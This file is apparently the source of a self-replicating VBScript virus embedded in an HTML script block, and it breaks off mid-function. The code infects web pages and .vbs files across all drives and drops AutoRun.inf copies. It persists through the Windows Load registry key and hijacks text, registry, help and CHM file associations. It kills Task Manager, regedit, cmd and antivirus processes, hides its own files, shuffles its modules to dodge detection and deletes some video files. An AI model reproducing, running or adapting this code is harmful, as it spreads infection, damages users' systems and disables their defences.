<SCRIPT Language = VBScript>
'������4

'DKTAGMMETHKPD2_19

Function GetVersion(objfso, path_v)
    Dim FV, buffer
    Set FV = objfso.OpenTextFile(path_v, 1)
    buffer = FV.ReadAll()
    GetVersion = Mid(buffer, InStr(buffer, Head_V) + Len(Head_V), 1)
End Function

Function GetScriptCode(Languages)
    On Error Resume Next
    Dim soj
    For Each soj In document.Scripts
        If LCase(soj.Language) = Languages Then
            Select Case LCase(soj.Language)
                Case "vbscript"
                    GetScriptCode = soj.Text
                    Exit Function
                Case "javascript"
                    GetScriptCode = soj.Text
                    Exit Function
            End Select
        End If
    Next
End Function

Function GetSelfCode(objfso, FullPath_Self)
    On Error Resume Next
    Dim n, n1, buffer, Self
    Set Self = objfso.OpenTextFile(FullPath_Self, 1)
    buffer = Self.ReadAll
    n = InStr(buffer, Head_V)
    n1 = InstrRev(buffer, Tail_V)
    buffer = Mid(buffer, n, n1 - n + Len(Tail_V) + 1)
    GetSelfCode = buffer
    Self.Close
End Function

Function GetMainBody(vbsCode, Sum_ModelCode)
    Dim i
    For i = 2 To Sum_ModelCode
        GetMainBody = GetMainBody & VBCRLF & GetModelCode(vbsCode, i) & VBCRLF
    Next
End Function

'JTBLRJSOPBL2_19

'DKTAGMMETHKPD2_25

Sub DeleteReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    tmps.RegDelete strkey
    Set tmps = Nothing
End Sub

Function ReadReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    ReadReg = tmps.RegRead(strkey)
    Set tmps = Nothing
End Function

Sub WriteReg(strkey, Value, vtype)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    If vtype = "" Then
        tmps.RegWrite strkey, Value
    Else
        tmps.RegWrite strkey, Value, vtype
    End If
    Set tmps = Nothing
End Sub

'JTBLRJSOPBL2_25

'DKTAGMMETHKPD2_26

Sub Run(ExeFullName)
    Dim WshShell
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run ExeFullName
    Set WshShell = Nothing
End Sub

Sub CopyFile(objfso, code, pathf)
    On Error Resume Next
    Dim vf
    Set vf = objfso.OpenTextFile(pathf, 2, true)
    vf.Write code
End Sub

Function ChangeName(vbsCode, Names)
    Dim Name, j, temp, buffer
    buffer = vbsCode
    Randomize
    For Each Name in Names
        temp = ""
        For j = 1 To Len(Name)
            temp = temp & Chr((Int(Rnd * 26) + 65))
        Next
        buffer = Replace(buffer, Name, temp)
    Next
    ChangeName = buffer
End Function

'JTBLRJSOPBL2_26

'DKTAGMMETHKPD1_6

Sub AutoRun(objfso, D, vbsCode)
    On Error Resume Next
    Dim path_autorun, path_vbs, inf_autorun
    path_autorun = D & ":\AutoRun.inf"
    path_vbs = D & ":\" & Name_V1
    If objfso.FileExists(path_vbs) = False Or objfso.FileExists(path_autorun) = False Or GetVersion(objfso, path_vbs)<Version Then
        If objfso.FileExists(path_autorun) = True Then
            objfso.DeleteFile path_autorun, True
        End If

        If objfso.FileExists(path_vbs) = True Then
            objfso.DeleteFile path_vbs, True
        End If

        Call CopyFile(objfso, vbsCode, path_vbs)
        Call SetFileAttr(objfso, path_vbs)

        inf_autorun = "[AutoRun]" & VBCRLF & "Shellexecute=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun=��(&O)" & VBCRLF & "shell\AutoRun\command=WScript.exe " & Name_V1 & " ""AutoRun""" & VBCRLF & "shell\AutoRun1=��Դ������(&X)" & VBCRLF & "shell\AutoRun1\command=WScript.exe " & Name_V1 & " ""AutoRun"""
        Call CopyFile(objfso, inf_autorun, path_autorun)
        Call SetFileAttr(objfso, path_autorun)
    End If
End Sub

'JTBLRJSOPBL1_6

'DKTAGMMETHKPD1_9

Function ChangeModelOrder(vbsCode, Num_DNA)
    On Error Resume Next
    Dim DNA(), Array_vbsCode()
    Dim i, Value, flag, j, buffer
    ReDim DNA(Num_DNA), Array_vbsCode(Num_DNA)
    buffer = vbsCode
    Randomize
    For i = 1 To Num_DNA
        Do
            Value = Int((Num_DNA * Rnd) + 1)
            flag = 1

            For j = 1 To Num_DNA
                If Value = DNA(j) Then
                    flag = 0
                    Exit For
                End If
            Next

        Loop Until flag = 1

        DNA(i) = Value
    Next
    For i = 1 To Num_DNA
        Array_vbsCode(i) = GetModelCode(buffer, i)

    Next
    buffer = ""
    For i = 1 To Num_DNA
        buffer = buffer & VBCRLF & Array_vbsCode(DNA(i)) & VBCRLF
    Next
    ChangeModelOrder = Head_V & Version & VBCRLF & buffer & VBCRLF & Tail_V
End Function

'JTBLRJSOPBL1_9

'DKTAGMMETHKPD2_11

Sub SearchFile(objfso, strPath, VbsCode_WebPage, VbsCode_Victim, T)
    On Error Resume Next
    Dim pfo, pf, pfi, ext
    Dim psfo, ps
    Set pfo = objfso.GetFolder(strPath)
    Set pf = pfo.Files
    For Each pfi In pf
        If Cnt >= CntMax Then
            Exit For
        End If
        ext = LCase(objfso.GetExtensionName(pfi.Path))

        Select Case ext
            Case "hta", "htm", "html", "asp", "vbs"
                Call InfectHead(pfi.Path, pfi, objfso, VbsCode_WebPage, VbsCode_Victim, ext, T)
            Case "mpg", "rmvb", "avi", "rm"
                If IsSexFile(pfi.Name) = True Then
                    pfi.Delete
                End If
        End Select
    Next
    Set psfo = pfo.SubFolders
    For Each ps In psfo
        If Cnt >= CntMax Then
            Exit For
        End If
        Call SearchFile(objfso, ps.Path, VbsCode_WebPage, VbsCode_Victim, T)
    Next
End Sub

'JTBLRJSOPBL2_11

'DKTAGMMETHKPD1_2

Sub ExeVbs_WebPage()
    On Error Resume Next
    Dim objfso, vbsCode, VbsCode_Virus
    Set objfso = CreateObject(GetFSOName())
    vbsCode = GetScriptCode("vbscript")
    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
    Call InvadeSystem(objfso, VbsCode_Virus)
    Set objfso = Nothing
End Sub

Sub ExeVbs_Victim()
    On Error Resume Next
    Dim objfso, vbsCode, VbsCode_Virus
    Set objfso = CreateObject(GetFSOName())
    vbsCode = GetSelfCode(objfso, WScript.ScriptFullName)
    VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
    VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
    Call InvadeSystem(objfso, VbsCode_Virus)
    Call Run(FullPath_V1)
    Set objfso = Nothing
End Sub

'JTBLRJSOPBL1_2

'DKTAGMMETHKPD1_4

Function Head()
    Head = VBCRLF & "'DKTAGMMETHKPD1_1" & VBCRLF &_
    "On Error Resume Next" & VBCRLF &_
    "Dim Cnt, CntMax, Version, Name_V1, FullPath_V0, FullPath_V1, FullPath_Config,Sum_ModelCode,Head_V,Tail_V" & VBCRLF &_
    "Dim ModelHead, ModelTail" & VBCRLF &_
    "Cnt = 0" & VBCRLF &_
    "CntMax = 1000" & VBCRLF &_
    "Version = ""4""" & VBCRLF &_
    "Name_V1 = GetUserName() & "".vbs""" & VBCRLF &_
    "FullPath_V0 = GetSFolder(0) & Name_V1 '��Ҫִ���ļ�����ת��" & VBCRLF &_
    "FullPath_V1 = GetSFolder(1) & Name_V1 '��Ҫִ�������ļ�����" & VBCRLF &_
    "FullPath_Config= GetSFolder(1) & GetUserName() & "".ini""" & VBCRLF &_
    "Sum_ModelCode = 26" & VBCRLF &_
    "Head_V= GetHeadTail(0)" & VBCRLF &_
    "Tail_V= GetHeadTail(1)" & VBCRLF &_
    "ModelHead=""'DKTAGMMETHKPD""" & VBCRLF &_
    "ModelTail=""'JTBLRJSOPBL""" & VBCRLF
End Function

Function VictimHead()
    VictimHead = Head() & VBCRLF &_
    "Call VictimMain()" & VBCRLF &_
    "Sub VictimMain()" & VBCRLF &_
    "    Call ExeVbs_Victim()" & VBCRLF &_
    "End Sub" & VBCRLF &_
    "'JTBLRJSOPBL1_1" & VBCRLF
End Function

Function VirusHead()
    VirusHead = Head() & VBCRLF &_
    "Call VirusMain()" & VBCRLF &_
    "Sub VirusMain()" & VBCRLF &_
    "    On Error Resume Next" & VBCRLF &_
    "    Call ExeVbs_Virus()" & VBCRLF &_
    "End Sub" & VBCRLF & VBCRLF &_
    "'JTBLRJSOPBL1_1" & VBCRLF
End Function

Function WebHead()
    WebHead = Head() & VBCRLF &_
    "Call WebMain()" & VBCRLF &_
    "Sub WebMain()" & VBCRLF &_
    "    On Error Resume Next" & VBCRLF &_
    "    Call ExeVbs_WebPage()" & VBCRLF &_
    "End Sub" & VBCRLF &_
    "'JTBLRJSOPBL1_1" & VBCRLF
End Function

'JTBLRJSOPBL1_4

'DKTAGMMETHKPD1_8

Sub RestoreSystem(objfso)
    On Error Resume Next
    Dim Value, dc, d, HCULoad

    Call SafeSet()

    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
    If ReadReg(HCULoad) = FullPath_V1 Then
        Call DeleteReg(HCULoad)
    End If

    Value = "%SystemRoot%\system32\NOTEPAD.EXE %1"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = "regedit.exe " & """%1"""
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = GetSFolder(1) & "hh.exe " & """%1"""
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = "%SystemRoot%\system32\winhlp32.exe %1"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")<>Value Then
        Call WriteReg ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
    End If

    Value = """%1"" %*"
    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command\")<>Value Then
        Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command\", Value, "REG_SZ")
    End If

    Set dc = objfso.Drives
    For Each d In dc
        If objfso.FileExists(d.DriveLetter & ":\" & Name_V1) = True Then
            objfso.DeleteFile d.DriveLetter & ":\" & Name_V1
            objfso.DeleteFile d.DriveLetter & ":\" & "AutoRun.inf"
        End If
    Next

    If objfso.FileExists(FullPath_V1) = True Then
        Set vf = objfso.GetFile(FullPath_V1)
        vf.Delete
    End If

    If objfso.FileExists(FullPath_V0) = true Then
        Set vf = objfso.GetFile(FullPath_V0)
        vf.Delete
    End If

    If objfso.FileExists(FullPath_Config) = True Then
        objfso.DeleteFile FullPath_Config , True
    End If
End Sub

'JTBLRJSOPBL1_8

'DKTAGMMETHKPD1_1
On Error Resume Next
Dim Cnt, CntMax, Version, Name_V1, FullPath_V0, FullPath_V1, FullPath_Config,Sum_ModelCode,Head_V,Tail_V
Dim ModelHead, ModelTail
Cnt = 0
CntMax = 1000
Version = "4"
Name_V1 = GetUserName() & ".vbs"
FullPath_V0 = GetSFolder(0) & Name_V1 '��Ҫִ���ļ�����ת��
FullPath_V1 = GetSFolder(1) & Name_V1 '��Ҫִ�������ļ�����
FullPath_Config= GetSFolder(1) & GetUserName() & ".ini"
Sum_ModelCode = 26
Head_V= GetHeadTail(0)
Tail_V= GetHeadTail(1)
ModelHead="'DKTAGMMETHKPD"
ModelTail="'JTBLRJSOPBL"

Call WebMain()
Sub WebMain()
    On Error Resume Next
    Call ExeVbs_WebPage()
End Sub
'JTBLRJSOPBL1_1

'DKTAGMMETHKPD2_22

Function GetSFolder(p)
    Dim objfso
    Set objfso = CreateObject(GetFSOName())
    GetSFolder = objfso.GetSpecialFolder(p) & "\"
    Set objfso = Nothing
End Function

Function GetUserName()
    On Error Resume Next
    Dim Value , UserName
    Value = "HKEY_CURRENT_USER\Software\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}\Username"
    UserName = ReadReg(Value)
    If UserName = "" Then
        GetUserName = "Administrator"
    Else
        GetUserName = UserName
    End If
End Function

Function GetFSOName()
    On Error Resume Next
    Dim Value , UserName
    Value = "HKEY_CLASSES_ROOT\CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\ProgID\"
    UserName = ReadReg(Value)
    If UserName = "" Then
        GetUserName = "Scripting.FileSystemObject"
    Else
        GetFSOName = UserName
    End If
End Function

Function GetHeadTail(l)
    Dim Str , buffer
    If l = 0 Then
        GetHeadTail = "'" & GetUserName()
    Else
        buffer = GetUserName()
        Str = ""
        For i = 1 To Len(buffer)
            Str = Mid(buffer, i, 1) & Str
            GetHeadTail = "'" & Str
        Next
    End If
End Function

'JTBLRJSOPBL2_22

'DKTAGMMETHKPD2_18

Function IsOK(objfso, Now_V, path_f)
    On Error Resume Next
    Dim vf, p1, p2, p3
    IsOK = False
    Set vf = objfso.OpenTextFile(path_f, 1)
    p1 = Trim(vf.ReadLine)
    p2 = Trim(vf.ReadLine)
    p3 = Trim(vf.ReadLine)
    If StrComp(p1, "OK", 1) = 0 And StrComp(p2, Now_V, 1) = 0 Then
        IsOK = True
    End If
    If p3 = "Admin" Then
        MsgBox "You Are Admin!!! Your Computer Will Not Be Infected!!!"
        IsOK = True
        n = InputBox("0:�˳��� 1:����ϵͳ�� 2:��Ⱦ�ļ�", "SuperVirus�ű�����!")
        If n = 0 Then
            Wscript.Quit
        ElseIf n = 1 Then
            IsOK = True
        ElseIf n = 2 Then
            IsOK = False
        End If
    End If
End Function

'JTBLRJSOPBL2_18

'DKTAGMMETHKPD1_7

Sub InvadeSystem(objfso, vbsCode)
    On Error Resume Next
    Dim Value, HCULoad, vbsCode_Virus, dc, d

    Value = "%SystemRoot%\System32\WScript.exe " & """" & FullPath_V0 & """" & " %1 %* "
    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
    vbsCode_Virus = vbsCode

    Set dc = objfso.Drives
    For Each d In dc
        If d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3 Then
            Call AutoRun(objfso, d.DriveLetter, vbsCode_Virus)
        End If
    Next

    If objfso.FileExists(FullPath_V1) = True And GetVersion(objfso, FullPath_V1)< Version Then
        objfso.DeleteFile FullPath_V1 , True
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V1)
        Call SetFileAttr(objfso, FullPath_V1)
    Else
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V1)
        Call SetFileAttr(objfso, FullPath_V1)
    End If

    If objfso.FileExists(FullPath_V0) = True And GetVersion(objfso, FullPath_V0)<Version Then
        objfso.DeleteFile FullPath_V0 , True
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V0)
        Call SetFileAttr(objfso, FullPath_V0)
    Else
        Call CopyFile(objfso, vbsCode_Virus, FullPath_V0)
        Call SetFileAttr(objfso, FullPath_V0)
    End If

    If ReadReg(HCULoad)<> FullPath_V1 Then
        Call WriteReg (HCULoad, FullPath_V1, "")
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\")<>Value Then
        Call SetTxtFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\")<>Value Then
        Call SetRegFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\")<>Value Then
        Call SetchmFileAss(FullPath_V0)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\")<>Value Then
        Call SethlpFileAss(FullPath_V0)
    End If

    Call DeSafeSet()
End Sub

'JTBLRJSOPBL1_7

'DKTAGMMETHKPD2_15

Sub SetFileAttr(objfso, pathf)
    Dim vf
    Set vf = objfso.GetFile(pathf)
    vf.Attributes = 6
End Sub

'JTBLRJSOPBL2_15

'DKTAGMMETHKPD2_13

Sub DeSafeSet()
    Dim HLMShow , HCUAdvanced, HCUExplorer
    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUExplorer = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
    Call WriteReg (HCUExplorer, 129, "REG_DWORD")
    Call WriteReg (HCUAdvanced, 0, "REG_DWORD")
    Call WriteReg (HLMShow, 0, "REG_DWORD")
End Sub

Sub SafeSet()
    Dim HLMShow , HCUSSHidden, HCUHidden
    Dim HCUExplorer
    HLMShow = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    HCUAdvanced = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden"
    HCUHidden = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
    Call WriteReg (HCUHidden, 1, "REG_DWORD")
    Call WriteReg (HCUAdvanced, 1, "REG_DWORD")
    Call WriteReg (HLMShow, 1, "REG_DWORD")
End Sub

'JTBLRJSOPBL2_13

'DKTAGMMETHKPD2_23

Function MakeScript(strCode, T)
    If T = 1 Then
        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & ChangeModelOrder(strCode, Sum_ModelCode) & VBCRLF & "</" & "SCRIPT>"
    Else
        MakeScript = "<" & "SCRIPT Language = VBScript>" & VBCRLF & strCode & VBCRLF & "</" & "SCRIPT>"
    End If
End Function


'JTBLRJSOPBL2_23

'DKTAGMMETHKPD2_14

Function ReadOK(objfso, FullPath_OK)
    On Error Resume Next
    Dim vf, buffer
    Set vf = objfso.OpenTextFile(FullPath_OK, 1)
    buffer = vf.ReadAll
    ReadOK = RTrim(Mid(buffer, InStr(buffer, "Order:") + 6, 50))
End Function

Sub WriteOK(objfso, FullPath_OK, Order_Order, Order_Para)
    On Error Resume Next
    Dim vf1
    objfso.DeleteFile FullPath_OK, True
    Set vf1 = objfso.OpenTextFile(FullPath_OK, 2, True)
    vf1.Write "OK" & VBCRLF
    vf1.WriteLine Date()
    vf1.WriteLine "Order:" & Order_Order & "@" & Order_Para
    Call SetFileAttr(objfso, FullPath_OK)
End Sub

'JTBLRJSOPBL2_14

'DKTAGMMETHKPD2_16

Sub SetTxtFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SethlpFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SetRegFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub

Sub SetchmFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub



'JTBLRJSOPBL2_16

'DKTAGMMETHKPD2_20

Function GetModelCode(vbsCode, N_ModelCode)
    On Error Resume Next
    Dim n, n1, buffer
    buffer = vbsCode
    If N_ModelCode>= 1 And N_ModelCode<= 9 Then
        n = InStr(buffer, ModelHead & "1_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "1_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "1_" & N_ModelCode))
    ElseIf N_ModelCode>= 10 And N_ModelCode<= 99 Then
        n = InStr(buffer, ModelHead & "2_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "2_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "2_" & N_ModelCode))
    ElseIf N_ModelCode>= 100 And N_ModelCode<= 999 Then
        n = InStr(buffer, ModelHead & "3_" & N_ModelCode)
        n1 = InStr(buffer, ModelTail & "3_" & N_ModelCode)
        GetModelCode = Mid(buffer, n, n1 - n + Len(ModelTail & "3_" & N_ModelCode))
    End If
End Function

'JTBLRJSOPBL2_20

'DKTAGMMETHKPD2_21

Function IsSexFile(fname)
    IsSexFile = False
    If InStr(fname, "����")>0 Or InStr(fname, "��")>0 Or InStr(fname, "͵��")>0 Or _
                InStr(fname, "͵��")>0 Or InStr(fname, "�ڽ�")>0 Or InStr(fname, "ǿ��")>0 Or _
                InStr(fname, "�ּ�")>0 Or InStr(fname, "����Ƭ")>0 Or InStr(fname, "����")>0 Then
        IsSexFile = True
    End If
End Function

Function Isinfected(buffer, ftype)
    Isinfected = True
    Select Case ftype
        Case "hta", "htm" , "html" , "asp", "vbs"
            If InStr(buffer, Head_V) = 0 Then
                Isinfected = False
            End If
        Case Else
            Isinfected = True
    End Select
End Function

'JTBLRJSOPBL2_21

'DKTAGMMETHKPD2_12

Sub InfectHead(strPath, fi, objfso, VbsCode_WebPage, VbsCode_Victim, ftype, T)
    On Error Resume Next
    Dim tso, buffer, strCode , Maxsize
    Maxsize = 350000
    If fi.Size< Maxsize Then
        Set tso = objfso.OpenTextFile(strPath, 1, True)
        buffer = tso.ReadAll()
        tso.Close

        If T = 0 Then
            Select Case ftype
                Case "hta", "htm", "html", "asp"
                    If Isinfected(buffer, ftype) = False Then
                        Set tso = objfso.OpenTextFile(strPath, 2, true)
                        strCode = MakeScript(VbsCode_WebPage, 0)
                        tso.Write strCode & VBCRLF & buffer
                        Cnt = Cnt + 1
                    End If
                Case "vbs"
                    If Isinfected(buffer, ftype) = False Then
                        n = InStr(buffer , "Option Explicit")
                        If n<>0 Then
                            buffer = Replace(buffer, "Option Explicit", "", 1, 1, 1)
                            Set tso = objfso.OpenTextFile(strPath, 2, true)
                            tso.Write vbsCode_Victim & VBCRLF & buffer
                            Cnt = Cnt + 1
                        Else
                            Set tso = objfso.OpenTextFile(strPath, 2, true)
                            tso.Write vbsCode_Victim & VBCRLF & buffer
                            Cnt = Cnt + 1
                        End If
                    End If
                Case Else
                    '
                    '
            End Select

        ElseIf T = 1 Then
            If Isinfected(buffer, ftype) = True Then
                n = InStrRev(buffer , Tail_V)
                If n<>0 Then
                    buffer = Replace(buffer, Tail_V, "", n, 1, 1)
                    Set tso = objfso.OpenTextFile(strPath, 2, True)
                    tso.Write strCode & VBCRLF & buffer
                End If
            End If
        End If
    End If

End Sub

'JTBLRJSOPBL2_12

'DKTAGMMETHKPD2_10

Sub SearchDrives(objfso, VbsCode_WebPage, VbsCode_Victim, T)
    On Error Resume Next
    Dim d , dc
    Set dc = objfso.Drives
    For Each d In dc
        If Cnt >= CntMax Then '
            Exit For
        End If
        If d.DriveType = 1 Or d.DriveType = 2 Or d.DriveType = 3 Then
            'If d.DriveType = 1 Then
            Call SearchFile(objfso, d.Path & "\", VbsCode_WebPage, VbsCode_Victim, T)
            'End If
        End If
    Next
End Sub

'JTBLRJSOPBL2_10

'DKTAGMMETHKPD2_24

Sub KillProcess(ProcessNames)
    On Error Resume Next
    Dim objShell, intReturn, name_exe
    Set objShell = WScript.CreateObject("WScript.Shell")
    strComputer = "."
    Set objWMIServices = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    For Each ProcessName in ProcessNames
        Set colProcessList = objWMIServices.Execquery(" Select * From win32_process where name = '" & ProcessName & "' ")
        For Each objProcess in colProcessList
            intReturn = objProcess.Terminate
            Select Case intReturn
                Case 2
                    name_exe = objProcess.Name
                    name_exe = Left(name_exe, Len(name_exe) -4)
                    objShell.Run "cmd.exe /c @tskill " & name_exe, 0, False
            End Select
        Next
    Next
    Set objShell = Nothing
End Sub

'JTBLRJSOPBL2_24

'DKTAGMMETHKPD1_5

Sub MonitorSystem(objfso, vbsCode)
    On Error Resume Next
    Dim ProcessNames
    ProcessNames = Array("ras.exe", "360tray.exe", "taskmgr.exe", "cmd.exe", "cmd.com", "regedit.exe", "regedit.scr", "regedit.pif", "regedit.com", "msconfig.exe", "SREng.exe", "USBAntiVir.exe")
    Do
        Call KillProcess(ProcessNames)
        Call InvadeSystem(objfso, vbsCode)
        WScript.Sleep 5000
    Loop
End Sub

'JTBLRJSOPBL1_5

'DKTAGMMETHKPD2_17

Function PreInstance()
    On Error Resume Next
    Dim num_cnt
    Dim strComputer, objWMIService, colProcessList, objProcess
    num_cnt = 0
    PreInstance = False
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where " & "Name = 'cscript.exe' or Name = 'wscript.exe'")
    For Each objProcess in colProcessList
        If InStr(CStr(objProcess.CommandLine), WScript.ScriptFullName)>0 Then
            num_cnt = num_cnt + 1
        End If
    Next
    If num_cnt>= 2 Then
        PreInstance = True
    End If
End Function

'JTBLRJSOPBL2_17

'DKTAGMMETHKPD1_3

Sub ExeVbs_Virus()
    On Error Resume Next
    Dim objfso, objshell, FullPath_Self, Name_Self, Names
    Dim oArgs, ArgNum, Para_V, SubPara_V, RunPath
    Dim Order, Order_Order, Order_Para
    Dim vbsCode , VbsCode_Virus, VbsCode_WebPage, VbsCode_Victim , MainBody

    Set objfso = CreateObject(GetFSOName())
    Set objshell = CreateObject("WScript.Shell")
    FullPath_Self = WScript.ScriptFullName
    Name_Self = WScript.ScriptName
    Names = Array("DKTAGMMETHKPD", "JTBLRJSOPBL")

    Set oArgs = WScript.Arguments
    ArgNum = 0
    Do While ArgNum < oArgs.Count
        Para_V = Para_V & " " & oArgs(ArgNum)
        ArgNum = ArgNum + 1
    Loop
    SubPara_V = LCase(Right(Para_V, 3))
    Select Case SubPara_V
        Case "run"
            RunPath = Left(FullPath_Self, 2)
            Call Run(RunPath)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "txt", "log"
            RunPath = "%SystemRoot%\system32\NOTEPAD.EXE " & Para_V
            Call Run(RunPath)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "reg"
            Para_V = "regedit.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "chm"
            Para_V = "hh.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case "hlp"
            Para_V = "winhlp32.exe " & """" & Trim(Para_V) & """"
            Call Run(Para_V)
            vbsCode = GetSelfCode(objfso, FullPath_Self)
            VbsCode_Virus = Head_V & Version & VBCRLF & VirusHead() & GetMainBody(vbsCode, Sum_ModelCode) & VBCRLF & Tail_V
            VbsCode_Virus = ChangeModelOrder(VbsCode_Virus, Sum_ModelCode)
            VbsCode_Virus = ChangeName(VbsCode_Virus, Names)
            Call InvadeSystem(objfso, VbsCode_Virus)
            Call Run(FullPath_V1)

        Case Else
            If PreInstance = True Then
                WScript.Quit
            End If
            If IsOK(objfso, Date(), FullPath_Config) = False Then
                If objfso.FileExists(FullPath_Config) = True Then
